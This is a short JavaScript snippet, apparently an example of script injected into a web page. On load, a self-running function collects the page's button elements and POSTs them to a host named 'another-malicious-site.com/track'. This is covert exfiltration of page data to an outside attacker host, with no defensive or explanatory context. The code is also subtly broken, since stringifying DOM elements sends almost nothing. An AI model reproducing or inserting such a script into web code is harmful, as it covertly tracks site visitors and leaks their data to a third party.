(function () {
  const button = document.getElementsByTagName("button");

  fetch("https://another-malicious-site.com/track", {
    method: "POST",
    body: JSON.stringify(button),
    headers: {
      "Content-Type": "application/json",
    },
  });
})();
